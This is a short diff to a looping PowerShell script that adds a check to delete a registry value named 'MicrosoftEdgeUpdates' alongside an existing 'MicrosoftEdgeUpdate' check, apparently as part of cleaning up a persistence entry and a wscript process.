@@ -201,6 +201,9 @@ while ($true) {
                         if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
                             Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
                         }
+                        if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdates" -ErrorAction SilentlyContinue) {
+                            Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdates"
+                        }
                         $process = Get-Process "wscript" -ErrorAction SilentlyContinue
 
                         if ($process) {
